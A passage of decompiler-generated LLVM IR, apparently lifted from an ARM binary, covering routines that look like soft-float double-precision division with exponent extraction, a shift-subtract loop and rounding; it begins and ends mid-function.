  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v11_16224

dec_label_pc_16234:                               ; preds = %dec_label_pc_161fc
  %v1_16234 = sub i32 0, %v2_161f4
  %v1_16238 = add i32 %v2_161f4, 32
  %v0_1623c = load i32, i32* @r1, align 4
  %v6_1623c = shl i32 %v0_1623c, %v1_16234
  %v6_16240 = lshr i32 %v0_1623c, %v1_16238
  %v1_16244 = load i32, i32* %r0.global-to-local, align 4
  %v7_16244 = shl i32 %v1_16244, %v1_16234
  %v8_16244 = or i32 %v7_16244, %v6_16240
  %v1_16248 = and i32 %v1_16244, -2147483648
  %tmp16 = icmp slt i32 %v6_1623c, 0
  %v4_1624c = zext i1 %tmp16 to i32
  %v5_1624c = add i32 %v8_16244, %v4_1624c
  store i32 %v5_1624c, i32* @r1, align 4
  %v6_1624c = icmp ult i32 %v5_1624c, %v8_16244
  %v2_16250 = zext i1 %v6_1624c to i32
  %v3_16250 = or i32 %v2_16250, %v1_16248
  store i32 %v3_16250, i32* %r0.global-to-local, align 4
  %v9_16250 = add nsw i32 %v3_16250, %v2_16250
  %v10_16250 = sub i32 0, %v1_16244
  %v11_16250 = and i32 %v9_16250, %v10_16250
  %v12_16250 = icmp slt i32 %v11_16250, 0
  store i1 %v12_16250, i1* @cpsr_v, align 1
  %v0_16254 = load i32, i32* @lr, align 4
  %v3_16254 = mul i32 %v6_1623c, 2
  %v4_16254 = or i32 %v0_16254, %v3_16254
  %v5_16254 = icmp slt i32 %v4_16254, 0
  store i1 %v5_16254, i1* @cpsr_n, align 1
  %v6_16254 = icmp eq i32 %v4_16254, 0
  store i1 %v6_16254, i1* @cpsr_z, align 1
  br i1 %v6_16254, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_16234
  %tmp17 = sext i1 %tmp16 to i32
  %v6_16258 = add nsw i32 %tmp17, -1
  %v7_16258 = and i32 %v5_1624c, %v6_16258
  store i32 %v7_16258, i32* @r1, align 4
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_16234, %bb9
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v3_16250

dec_label_pc_16260:                               ; preds = %bb6
  %v1_16260 = sub i32 32, %v2_161f4
  %v0_16264 = load i32, i32* @lr, align 4
  %v1_16264 = load i32, i32* @r1, align 4
  %v7_16264 = shl i32 %v1_16264, %v1_16260
  %v8_16264 = or i32 %v7_16264, %v0_16264
  %v6_16268 = lshr i32 %v1_16264, %v2_161f4
  %v1_1626c = load i32, i32* %r0.global-to-local, align 4
  %v7_1626c = shl i32 %v1_1626c, %v1_16260
  %v8_1626c = or i32 %v7_1626c, %v6_16268
  %v6_16270 = lshr i32 %v1_1626c, %v2_161f4
  %v1_16274 = and i32 %v1_1626c, -2147483648
  store i32 %v1_16274, i32* %r0.global-to-local, align 4
  %v7_16278 = lshr i32 %v1_16274, %v2_161f4
  %v8_16278 = sub i32 -1, %v7_16278
  %v9_16278 = and i32 %v6_16270, %v8_16278
  %tmp18 = icmp slt i32 %v8_1626c, 0
  %v4_1627c = zext i1 %tmp18 to i32
  %v5_1627c = add i32 %v4_1627c, %v9_16278
  store i32 %v5_1627c, i32* @r1, align 4
  %v3_16280 = mul i32 %v8_1626c, 2
  %v4_16280 = or i32 %v8_16264, %v3_16280
  %v5_16280 = icmp slt i32 %v4_16280, 0
  store i1 %v5_16280, i1* @cpsr_n, align 1
  %v6_16280 = icmp eq i32 %v4_16280, 0
  store i1 %v6_16280, i1* @cpsr_z, align 1
  br i1 %v6_16280, label %bb11, label %bb12

bb11:                                             ; preds = %dec_label_pc_16260
  %tmp19 = sext i1 %tmp18 to i32
  %v6_16284 = add nsw i32 %tmp19, -1
  %v7_16284 = and i32 %v5_1627c, %v6_16284
  store i32 %v7_16284, i32* @r1, align 4
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_16260, %bb11
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v1_16274

dec_label_pc_16344:                               ; preds = %dec_label_pc_161dc
  %v0_16344 = load i32, i32* %r0.global-to-local, align 4
  %v1_16344 = and i32 %v0_16344, -2147483648
  %v1_1634c = or i32 %v1_16344, 2146435072
  store i32 %v1_1634c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v1_1634c

; uselistorder directives
  uselistorder i32 %v3_16250, { 2, 0, 1 }
  uselistorder i32 %v8_16244, { 1, 0 }
  uselistorder i32 %v1_16234, { 1, 0 }
  uselistorder i32 %v11_16224, { 1, 0, 2 }
  uselistorder i32 %v1_16214, { 1, 0, 2, 3 }
  uselistorder i32 %v1_16208, { 1, 0 }
  uselistorder i32 %v2_161f4, { 5, 6, 7, 9, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 %v1_161f0, { 1, 0 }
  uselistorder i32 %v4_161e0, { 1, 2, 0 }
  uselistorder i32 %v0_161e0, { 3, 2, 1, 4, 0, 5 }
  uselistorder i32 %tmp4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp3, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp2, { 4, 3, 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 0, 7, 1, 8, 2, 9, 3, 10, 4, 5 }
  uselistorder i32 12, { 18, 19, 13, 11, 60, 61, 62, 63, 64, 65, 12, 66, 67, 68, 69, 70, 71, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 14, 17, 40, 53, 54, 55, 56, 0, 57, 5, 58, 1, 59, 15, 72, 2, 33, 34, 35, 36, 37, 38, 39, 41, 4, 42, 10, 43, 44, 3, 45, 46, 9, 47, 48, 8, 49, 7, 6, 50, 51, 16, 52 }
  uselistorder i32 -32, { 2, 1, 3, 4, 5, 6, 0, 7 }
  uselistorder i32 54, { 1, 0 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @function_16358(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_16358:
  %v1_1635c = or i32 %arg1, 2146959360
  store i32 %arg2, i32* @r4, align 4
  ret i32 %v1_1635c
}

define i32 @function_16364(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_16364:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_16364 = load i32, i32* @r4, align 4
  store i32 %v3_16364, i32* %stack_var_-16, align 4
  %v6_16364 = load i32, i32* @r5, align 4
  %v9_16364 = load i32, i32* @r6, align 4
  store i32 2047, i32* @ip, align 4
  %v1_16370 = load i32, i32* %r0.global-to-local, align 4
  %v4_16370 = udiv i32 %v1_16370, 1048576
  %v5_16370 = urem i32 %v4_16370, 2048
  store i32 %v5_16370, i32* @r4, align 4
  %v6_16370 = icmp eq i32 %v5_16370, 0
  br i1 %v6_16370, label %dec_label_pc_16364..thread2_crit_edge, label %bb

dec_label_pc_16364..thread2_crit_edge:            ; preds = %dec_label_pc_16364
  %.pre150 = udiv i32 %arg3, 1048576
  br label %.thread2

bb:                                               ; preds = %dec_label_pc_16364
  %v5_16374 = udiv i32 %arg3, 1048576
  %v6_16374 = urem i32 %v5_16374, 2048
  store i32 %v6_16374, i32* %r5.global-to-local, align 4
  %v7_16374 = icmp eq i32 %v6_16374, 0
  br i1 %v7_16374, label %.thread1, label %bb92

.thread1:                                         ; preds = %bb
  br label %dec_label_pc_164f8

bb92:                                             ; preds = %bb
  %v5_16378 = icmp eq i32 %v5_16370, 2047
  br i1 %v5_16378, label %.thread2, label %bb93

.thread2:                                         ; preds = %dec_label_pc_16364..thread2_crit_edge, %bb92
  %.pre148.pre-phi = phi i32 [ %.pre150, %dec_label_pc_16364..thread2_crit_edge ], [ %v5_16374, %bb92 ]
  br label %dec_label_pc_164f8

bb93:                                             ; preds = %bb92
  %v5_1637c = icmp eq i32 %v6_16374, 2047
  br i1 %v5_1637c, label %dec_label_pc_164f8, label %dec_label_pc_16384

dec_label_pc_16384:                               ; preds = %bb93
  %v2_16384 = sub nsw i32 %v5_16370, %v6_16374
  store i32 %v2_16384, i32* %r4.global-to-local, align 4
  %v2_16388 = xor i32 %v1_16370, %arg3
  %v4_1638c = mul i32 %arg3, 4096
  %v5_1638c = or i32 %v4_1638c, %arg4
  store i32 %v5_1638c, i32* %r5.global-to-local, align 4
  %v7_1638c = icmp eq i32 %v5_1638c, 0
  %v3_16390 = mul i32 %v1_16370, 4096
  store i32 %v3_16390, i32* %r0.global-to-local, align 4
  br i1 %v7_1638c, label %dec_label_pc_164c8, label %dec_label_pc_16398

dec_label_pc_16398:                               ; preds = %dec_label_pc_16384
  %tmp94 = mul i32 %arg3, 256
  %v4_163a0 = and i32 %tmp94, 268435200
  %v4_163a4 = udiv i32 %arg4, 16777216
  %v5_163a0 = or i32 %v4_163a4, %v4_163a0
  %v5_163a4 = or i32 %v5_163a0, 268435456
  store i32 %v5_163a4, i32* %r2.global-to-local, align 4
  %v3_163a8 = mul i32 %arg4, 256
  store i32 %v3_163a8, i32* %r3.global-to-local, align 4
  %tmp95 = mul i32 %v1_16370, 256
  %v4_163ac = and i32 %tmp95, 268435200
  %v1_163b0 = load i32, i32* @r1, align 4
  %v4_163b0 = udiv i32 %v1_163b0, 16777216
  %v5_163ac = or i32 %v4_163ac, %v4_163b0
  %v5_163b0 = or i32 %v5_163ac, 268435456
  store i32 %v5_163b0, i32* %r5.global-to-local, align 4
  %v3_163b4 = mul i32 %v1_163b0, 256
  store i32 %v3_163b4, i32* %r6.global-to-local, align 4
  %v1_163b8 = and i32 %v2_16388, -2147483648
  store i32 %v1_163b8, i32* %r0.global-to-local, align 4
  %v3_163bc = icmp uge i32 %v5_163b0, %v5_163a4
  %v9_163bc = icmp eq i32 %v5_163b0, %v5_163a4
  br i1 %v9_163bc, label %bb96, label %bb97

bb96:                                             ; preds = %dec_label_pc_16398
  %v4_163c0 = icmp uge i32 %v3_163b4, %v3_163a8
  br label %bb97

bb97:                                             ; preds = %dec_label_pc_16398, %bb96
  %v1_163c4 = phi i1 [ %v3_163bc, %dec_label_pc_16398 ], [ %v4_163c0, %bb96 ]
  %v2_163c4 = add nsw i32 %v2_16384, 253
  %v3_163c4 = zext i1 %v1_163c4 to i32
  %v4_163c4 = add nsw i32 %v2_163c4, %v3_163c4
  %v8_163c4 = icmp ule i32 %v4_163c4, %v2_16384
  %v9_163c4 = icmp ugt i32 %v2_16384, -254
  %v10_163c4 = select i1 %v1_163c4, i1 %v8_163c4, i1 %v9_163c4
  %v1_163c8 = add nsw i32 %v4_163c4, 768
  store i32 %v1_163c8, i32* %r4.global-to-local, align 4
  br i1 %v10_163c4, label %dec_label_pc_163d8, label %dec_label_pc_163d0

dec_label_pc_163d0:                               ; preds = %bb97
  %v3_163d0 = udiv i32 %v5_163a4, 2
  store i32 %v3_163d0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_163d8

dec_label_pc_163d8:                               ; preds = %bb97, %dec_label_pc_163d0
  %v0_163e0 = phi i32 [ %v5_163a4, %bb97 ], [ %v3_163d0, %dec_label_pc_163d0 ]
  %v0_163e4 = phi i32 [ %v3_163a8, %bb97 ], [ 0, %dec_label_pc_163d0 ]
  %v2_163d8 = sub i32 %v3_163b4, %v0_163e4
  store i32 %v2_163d8, i32* %r6.global-to-local, align 4
  %v3_163d8 = icmp uge i32 %v3_163b4, %v0_163e4
  %v3_163dc = icmp eq i1 %v3_163d8, false
  %v4_163dc = sub nsw i32 %v5_163b0, %v0_163e0
  %v6_163dc = sext i1 %v3_163dc to i32
  %v7_163dc = add nsw i32 %v6_163dc, %v4_163dc
  store i32 %v7_163dc, i32* %r5.global-to-local, align 4
  %v3_163e0 = udiv i32 %v0_163e0, 2
  store i32 %v3_163e0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_163f0.outer

dec_label_pc_163f0.outer:                         ; preds = %dec_label_pc_16488, %dec_label_pc_163d8
  %v1_1649c.ph = phi i32 [ %v2_16488, %dec_label_pc_16488 ], [ %v1_163b8, %dec_label_pc_163d8 ]
  %v0_163f4.ph = phi i32 [ %v5_16464, %dec_label_pc_16488 ], [ %v7_163dc, %dec_label_pc_163d8 ]
  %v1_163f8.ph = phi i32 [ %v3_16468, %dec_label_pc_16488 ], [ %v2_163d8, %dec_label_pc_163d8 ]
  %v5_1647017.ph = phi i32 [ %v5_16470, %dec_label_pc_16488 ], [ %v3_163e0, %dec_label_pc_163d8 ]
  %v3_1647413.ph = phi i32 [ %v3_16474, %dec_label_pc_16488 ], [ 0, %dec_label_pc_163d8 ]
  %storemerge136 = phi i32 [ 0, %dec_label_pc_16488 ], [ 1048576, %dec_label_pc_163d8 ]
  %storemerge = phi i32 [ -2147483648, %dec_label_pc_16488 ], [ 524288, %dec_label_pc_163d8 ]
  store i32 %storemerge136, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_163f0

dec_label_pc_163f0:                               ; preds = %dec_label_pc_163f0.outer, %dec_label_pc_16460
  %v1_1645459 = phi i32 [ %v2_1649c, %dec_label_pc_16460 ], [ %storemerge136, %dec_label_pc_163f0.outer ]
  %v1_16400 = phi i32 [ %v1_1640032, %dec_label_pc_16460 ], [ %storemerge136, %dec_label_pc_163f0.outer ]
  %v1_1641c41 = phi i32 [ %v1_1641c43, %dec_label_pc_16460 ], [ %storemerge136, %dec_label_pc_163f0.outer ]
  %v1_1643850 = phi i32 [ %v1_1643852, %dec_label_pc_16460 ], [ %storemerge136, %dec_label_pc_163f0.outer ]
  %v0_16478 = phi i32 [ %v3_16478, %dec_label_pc_16460 ], [ %storemerge, %dec_label_pc_163f0.outer ]
  %v0_163f4 = phi i32 [ %v5_16464, %dec_label_pc_16460 ], [ %v0_163f4.ph, %dec_label_pc_163f0.outer ]
  %v1_163f8 = phi i32 [ %v3_16468, %dec_label_pc_16460 ], [ %v1_163f8.ph, %dec_label_pc_163f0.outer ]
  %v5_1647017 = phi i32 [ %v5_16470, %dec_label_pc_16460 ], [ %v5_1647017.ph, %dec_label_pc_163f0.outer ]
  %v3_1647413 = phi i32 [ %v3_16474, %dec_label_pc_16460 ], [ %v3_1647413.ph, %dec_label_pc_163f0.outer ]
  %v3_163f0 = icmp uge i32 %v1_163f8, %v3_1647413
  %v3_163f4 = icmp eq i1 %v3_163f0, false
  %v4_163f4 = sub i32 %v0_163f4, %v5_1647017
  %v6_163f4 = sext i1 %v3_163f4 to i32
  %v7_163f4 = add i32 %v6_163f4, %v4_163f4
  %v8_163f4 = zext i1 %v3_163f4 to i32
  %v9_163f4 = sub i32 %v7_163f4, %v8_163f4
  %v10_163f4 = icmp ult i32 %v0_163f4, %v9_163f4
  %v11_163f4 = icmp ne i32 %v5_1647017, -1
  %v12_163f4 = or i1 %v11_163f4, %v10_163f4
  %v13_163f4 = icmp ult i32 %v0_163f4, %v5_1647017
  %v14_163f4 = select i1 %v3_163f4, i1 %v12_163f4, i1 %v13_163f4
  br i1 %v14_163f4, label %.thread4, label %bb98

bb98:                                             ; preds = %dec_label_pc_163f0
  %v3_163f8 = sub i32 %v1_163f8, %v3_1647413
  store i32 %v3_163f8, i32* %r6.global-to-local, align 4
  store i32 %v7_163f4, i32* %r5.global-to-local, align 4
  %v3_16400 = or i32 %v1_16400, %v0_16478
  store i32 %v3_16400, i32* %r1.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_163f0, %bb98
  %v1_1645458 = phi i32 [ %v1_1645459, %dec_label_pc_163f0 ], [ %v3_16400, %bb98 ]
  %v1_1640035 = phi i32 [ %v1_16400, %dec_label_pc_163f0 ], [ %v3_16400, %bb98 ]
  %v1_1641c = phi i32 [ %v1_1641c41, %dec_label_pc_163f0 ], [ %v3_16400, %bb98 ]
  %v1_1643849 = phi i32 [ %v1_1643850, %dec_label_pc_163f0 ], [ %v3_16400, %bb98 ]
  %v0_16410 = phi i32 [ %v0_163f4, %dec_label_pc_163f0 ], [ %v7_163f4, %bb98 ]
  %v1_16414 = phi i32 [ %v1_163f8, %dec_label_pc_163f0 ], [ %v3_163f8, %bb98 ]
  %v1_16404 = urem i32 %v5_1647017, 2
  %v2_16404 = icmp ne i32 %v1_16404, 0
  %v3_16404 = udiv i32 %v5_1647017, 2
  %v3_16408 = zext i1 %v2_16404 to i32
  %v6_16408 = zext i32 %v3_1647413 to i64
  %v7_16408 = sub i32 33, %v3_1647413
  %v8_16408 = zext i32 %v7_16408 to i64
  %v9_16408 = shl i64 %v6_16408, %v8_16408
  %v10_16408 = sub i32 32, %v3_1647413
  %v11_16408 = shl i32 %v3_16408, %v10_16408
  %v12_16408 = zext i32 %v11_16408 to i64
  %v14_16408 = or i64 %v12_16408, %v9_16408
  %v15_16408 = trunc i64 %v14_16408 to i32
  %v3_1640c = icmp uge i32 %v1_16414, %v15_16408
  %v3_16410 = icmp eq i1 %v3_1640c, false
  %v4_16410 = sub i32 %v0_16410, %v3_16404
  %v6_16410 = sext i1 %v3_16410 to i32
  %v7_16410 = add i32 %v6_16410, %v4_16410
  %v13_16410 = icmp ult i32 %v0_16410, %v3_16404
  %v14_16410 = or i1 %v13_16410, %v3_16410
  br i1 %v14_16410, label %.thread6, label %bb99

bb99:                                             ; preds = %.thread4
  %v3_16414 = sub i32 %v1_16414, %v15_16408
  store i32 %v3_16414, i32* %r6.global-to-local, align 4
  store i32 %v7_16410, i32* %r5.global-to-local, align 4
  %v5_1641c = udiv i32 %v0_16478, 2
  %v6_1641c = or i32 %v1_1641c, %v5_1641c
  store i32 %v6_1641c, i32* %r1.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %.thread4, %bb99
  %v1_1645457 = phi i32 [ %v1_1645458, %.thread4 ], [ %v6_1641c, %bb99 ]
  %v1_1640034 = phi i32 [ %v1_1640035, %.thread4 ], [ %v6_1641c, %bb99 ]
  %v1_1641c45 = phi i32 [ %v1_1641c, %.thread4 ], [ %v6_1641c, %bb99 ]
  %v1_16438 = phi i32 [ %v1_1643849, %.thread4 ], [ %v6_1641c, %bb99 ]
  %v0_1642c = phi i32 [ %v0_16410, %.thread4 ], [ %v7_16410, %bb99 ]
  %v1_16430 = phi i32 [ %v1_16414, %.thread4 ], [ %v3_16414, %bb99 ]
  %v1_16420 = urem i32 %v3_16404, 2
  %v2_16420 = icmp ne i32 %v1_16420, 0
  %v3_16420 = udiv i32 %v5_1647017, 4
  %v3_16424 = zext i1 %v2_16420 to i32
  %v6_16424 = and i64 %v14_16408, 4294967295
  %v7_16424 = sub i32 33, %v15_16408
  %v8_16424 = zext i32 %v7_16424 to i64
  %v9_16424 = shl i64 %v6_16424, %v8_16424
  %v10_16424 = sub i32 32, %v15_16408
  %v11_16424 = shl i32 %v3_16424, %v10_16424
  %v12_16424 = zext i32 %v11_16424 to i64
  %v14_16424 = or i64 %v12_16424, %v9_16424
  %v15_16424 = trunc i64 %v14_16424 to i32
  %v3_16428 = icmp uge i32 %v1_16430, %v15_16424
  %v3_1642c = icmp eq i1 %v3_16428, false
  %v4_1642c = sub i32 %v0_1642c, %v3_16420
  %v6_1642c = sext i1 %v3_1642c to i32
  %v7_1642c = add i32 %v6_1642c, %v4_1642c
  %v13_1642c = icmp ult i32 %v0_1642c, %v3_16420
  %v14_1642c = or i1 %v13_1642c, %v3_1642c
  br i1 %v14_1642c, label %.thread8, label %bb100

bb100:                                            ; preds = %.thread6
  %v3_16430 = sub i32 %v1_16430, %v15_16424
  store i32 %v3_16430, i32* %r6.global-to-local, align 4
  store i32 %v7_1642c, i32* %r5.global-to-local, align 4
  %v5_16438 = udiv i32 %v0_16478, 4
  %v6_16438 = or i32 %v1_16438, %v5_16438
  store i32 %v6_16438, i32* %r1.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread6, %bb100
  %v1_16454 = phi i32 [ %v1_1645457, %.thread6 ], [ %v6_16438, %bb100 ]
  %v1_1640033 = phi i32 [ %v1_1640034, %.thread6 ], [ %v6_16438, %bb100 ]
  %v1_1641c44 = phi i32 [ %v1_1641c45, %.thread6 ], [ %v6_16438, %bb100 ]
  %v1_1643853 = phi i32 [ %v1_16438, %.thread6 ], [ %v6_16438, %bb100 ]
  %v0_16448 = phi i32 [ %v0_1642c, %.thread6 ], [ %v7_1642c, %bb100 ]
  %v1_1644c = phi i32 [ %v1_16430, %.thread6 ], [ %v3_16430, %bb100 ]
  %v1_1643c = urem i32 %v3_16420, 2
  %v2_1643c = icmp ne i32 %v1_1643c, 0
  %v3_1643c = udiv i32 %v5_1647017, 8
  %v3_16440 = zext i1 %v2_1643c to i32
  %v6_16440 = and i64 %v14_16424, 4294967295
  %v7_16440 = sub i32 33, %v15_16424
  %v8_16440 = zext i32 %v7_16440 to i64
  %v9_16440 = shl i64 %v6_16440, %v8_16440
  %v10_16440 = sub i32 32, %v15_16424
  %v11_16440 = shl i32 %v3_16440, %v10_16440
  %v12_16440 = zext i32 %v11_16440 to i64
  %v14_16440 = or i64 %v12_16440, %v9_16440
  %v15_16440 = trunc i64 %v14_16440 to i32
  %v3_16444 = icmp uge i32 %v1_1644c, %v15_16440
  %v3_16448 = icmp eq i1 %v3_16444, false
  %v4_16448 = sub i32 %v0_16448, %v3_1643c
  %v6_16448 = sext i1 %v3_16448 to i32
  %v7_16448 = add i32 %v6_16448, %v4_16448
  %v13_16448 = icmp ult i32 %v0_16448, %v3_1643c
  %v14_16448 = or i1 %v13_16448, %v3_16448
  br i1 %v14_16448, label %.thread10, label %bb102

bb102:                                            ; preds = %.thread8
  %v3_1644c = sub i32 %v1_1644c, %v15_16440
  store i32 %v3_1644c, i32* %r6.global-to-local, align 4
  store i32 %v7_16448, i32* %r5.global-to-local, align 4
  %v5_16454 = udiv i32 %v0_16478, 8
  %v6_16454 = or i32 %v1_16454, %v5_16454
  store i32 %v6_16454, i32* %r1.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8, %bb102
  %v1_16464 = phi i32 [ %v1_1644c, %.thread8 ], [ %v3_1644c, %bb102 ]
  %v0_16460 = phi i32 [ %v0_16448, %.thread8 ], [ %v7_16448, %bb102 ]
  %v2_1649c = phi i32 [ %v1_16454, %.thread8 ], [ %v6_16454, %bb102 ]
  %v1_1640032 = phi i32 [ %v1_1640033, %.thread8 ], [ %v6_16454, %bb102 ]
  %v1_1641c43 = phi i32 [ %v1_1641c44, %.thread8 ], [ %v6_16454, %bb102 ]
  %v1_1643852 = phi i32 [ %v1_1643853, %.thread8 ], [ %v6_16454, %bb102 ]
  %v2_16458 = or i32 %v0_16460, %v1_16464
  %v4_16458 = icmp eq i32 %v2_16458, 0
  br i1 %v4_16458, label %dec_label_pc_16498, label %dec_label_pc_16460

dec_label_pc_16460:                               ; preds = %.thread10
  %v3_16460 = mul i32 %v0_16460, 16
  %v4_16464 = udiv i32 %v1_16464, 268435456
  %v5_16464 = or i32 %v3_16460, %v4_16464
  store i32 %v5_16464, i32* %r5.global-to-local, align 4
  %v3_16468 = mul i32 %v1_16464, 16
  store i32 %v3_16468, i32* %r6.global-to-local, align 4
  %v3_1646c = mul nuw i32 %v3_1643c, 8
  %v4_16470 = udiv i32 %v15_16440, 536870912
  %v5_16470 = or i32 %v4_16470, %v3_1646c
  %v3_16474 = mul i32 %v15_16440, 8
  %v3_16478 = udiv i32 %v0_16478, 16
  %tmp = icmp ult i32 %v0_16478, 16
  br i1 %tmp, label %dec_label_pc_16480, label %dec_label_pc_163f0

dec_label_pc_16480:                               ; preds = %dec_label_pc_16460
  %v1_16480 = and i32 %v1_1649c.ph, 1048576
  %v2_16480 = icmp eq i32 %v1_16480, 0
  br i1 %v2_16480, label %dec_label_pc_16488, label %.thread11.loopexit

dec_label_pc_16488:                               ; preds = %dec_label_pc_16480
  %v2_16488 = or i32 %v2_1649c, %v1_1649c.ph
  store i32 %v2_16488, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_163f0.outer

dec_label_pc_16498:                               ; preds = %.thread10
  store i32 %v15_16440, i32* %r3.global-to-local, align 4
  store i32 %v3_1643c, i32* %r2.global-to-local, align 4
  %v1_16498 = and i32 %v1_1649c.ph, 1048576
  %v2_16498 = icmp eq i32 %v1_16498, 0
  br i1 %v2_16498, label %bb103, label %.thread11

bb103:                                            ; preds = %dec_label_pc_16498
  %v3_1649c = or i32 %v2_1649c, %v1_1649c.ph
  store i32 %v3_1649c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %.thread11

.thread11.loopexit:                               ; preds = %dec_label_pc_16480
  store i32 %v3_16474, i32* %r3.global-to-local, align 4
  store i32 %v5_16470, i32* %r2.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %.thread11.loopexit, %dec_label_pc_16498, %bb103
  %v1_164a4 = add nsw i32 %v4_163c4, 515
  %v2_164a4 = icmp ugt i32 %v1_163c8, 252
  %v7_164a4 = icmp eq i32 %v1_163c8, 253
  %v2_164a8 = xor i1 %v7_164a4, true
  %v3_164a8 = and i1 %v2_164a4, %v2_164a8
  br i1 %v3_164a8, label %bb104, label %bb105

bb104:                                            ; preds = %.thread11
  %v6_164a8 = icmp ugt i32 %v1_164a4, 1791
  %v11_164a8 = icmp eq i32 %v1_164a4, 1792
  br label %bb105

bb105:                                            ; preds = %.thread11, %bb104
  %v1_164ac = phi i1 [ %v7_164a4, %.thread11 ], [ %v11_164a8, %bb104 ]
  %v0_164ac = phi i1 [ %v2_164a4, %.thread11 ], [ %v6_164a8, %bb104 ]
  %v2_164ac = xor i1 %v1_164ac, true
  %v3_164ac = and i1 %v0_164ac, %v2_164ac
  call void @__pseudo_cond_branch(i1 %v3_164ac, i32 ptrtoint (i32* @global_var_161dc.441 to i32))
  %v0_164b0 = load i32, i32* %r5.global-to-local, align 4
  %v1_164b0 = load i32, i32* %r2.global-to-local, align 4
  %v2_164b0 = sub i32 %v0_164b0, %v1_164b0
  store i32 %v2_164b0, i32* @ip, align 4
  %v3_164b0 = icmp uge i32 %v0_164b0, %v1_164b0
  %v9_164b0 = icmp eq i32 %v0_164b0, %v1_164b0
  br i1 %v9_164b0, label %bb106, label %.thread12

bb106:                                            ; preds = %bb105
  %v1_164b4 = load i32, i32* %r6.global-to-local, align 4
  %v2_164b4 = load i32, i32* %r3.global-to-local, align 4
  %v3_164b4 = sub i32 %v1_164b4, %v2_164b4
  store i32 %v3_164b4, i32* @ip, align 4
  %v4_164b4 = icmp uge i32 %v1_164b4, %v2_164b4
  %v10_164b4 = icmp eq i32 %v1_164b4, %v2_164b4
  br i1 %v10_164b4, label %bb107, label %.thread12

bb107:                                            ; preds = %bb106
  %v1_164b8 = load i32, i32* %r1.global-to-local, align 4
  %v2_164b8 = urem i32 %v1_164b8, 2
  %v3_164b8 = icmp ne i32 %v2_164b8, 0
  %v4_164b8 = udiv i32 %v1_164b8, 2
  store i32 %v4_164b8, i32* @ip, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb105, %bb106, %bb107
  %v1_164bc = phi i1 [ %v3_164b0, %bb105 ], [ %v4_164b4, %bb106 ], [ %v3_164b8, %bb107 ]
  %v0_164bc = load i32, i32* %r1.global-to-local, align 4
  %v2_164bc = zext i1 %v1_164bc to i32
  %v3_164bc = add i32 %v2_164bc, %v0_164bc
  store i32 %v3_164bc, i32* @r1, align 4
  %v0_164c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_164c0 = load i32, i32* %r4.global-to-local, align 4
  %v2_164c0 = and i32 %v1_164c0, 4096
  %v3_164c0 = icmp ne i32 %v2_164c0, 0
  %v4_164c0 = mul i32 %v1_164c0, 1048576
  %v6_164c0 = add i32 %v4_164c0, %v0_164c0
  %v7_164c0 = zext i1 %v3_164c0 to i32
  %v8_164c0 = add i32 %v7_164c0, %v6_164c0
  store i32 %v8_164c0, i32* %r0.global-to-local, align 4
  %v2_164c4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_164c4, i32* @r4, align 4
  store i32 %v6_16364, i32* @r5, align 4
  store i32 %v9_16364, i32* @r6, align 4
  ret i32 %v8_164c0

dec_label_pc_164c8:                               ; preds = %dec_label_pc_16384
  %v1_164c8 = and i32 %v2_16388, -2147483648
  %v4_164cc = urem i32 %v1_16370, 1048576
  %v5_164cc = or i32 %v1_164c8, %v4_164cc
  store i32 %v5_164cc, i32* %r0.global-to-local, align 4
  %v6_164d0 = add nsw i32 %v2_16384, 1023
  store i32 %v6_164d0, i32* %r4.global-to-local, align 4
  %v8_164d0 = sub nsw i32 0, %v2_16384
  %v9_164d0 = and i32 %v6_164d0, %v8_164d0
  %v11_164d0 = icmp slt i32 %v2_16384, -1023
  %v12_164d0 = icmp eq i32 %v6_164d0, 0
  %v7_164d4 = icmp sgt i32 %v2_16384, -1023
  br i1 %v7_164d4, label %bb108, label %bb109

bb108:                                            ; preds = %dec_label_pc_164c8
  %v10_164d4 = sub nsw i32 1024, %v2_16384
